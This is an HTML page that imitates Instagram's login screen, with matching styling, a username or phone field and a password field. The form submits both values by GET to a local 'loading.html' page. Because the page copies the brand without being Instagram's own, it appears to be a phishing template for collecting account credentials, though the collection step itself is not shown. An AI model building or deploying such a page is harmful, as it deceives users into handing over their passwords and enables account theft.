<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body {
            margin: 0;
            font-family: Arial;
            background: #fafafa;
        }

        .container {
            width: 300px;
            margin: 120px auto;
            background: white;
            padding: 25px;
            border: 1px solid #ddd;
            text-align: center;
        }

        h2 {
            font-family: cursive;
        }

        input {
            width: 90%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
        }

        button {
            width: 100%;
            padding: 10px;
            background: #3897f0;
            color: white;
            border: none;
        }
    </style>
</head>

<body>

<div class="container">
    <h2>Instagram</h2>
    <form action="loading.html" method="GET">
        <input type="text" name="user" placeholder="Phone number, username"><br>
        <input type="password" name="pass" placeholder="Password"><br>
        <button type="submit">Log In</button>
    </form>
</div>

</body>
</html>
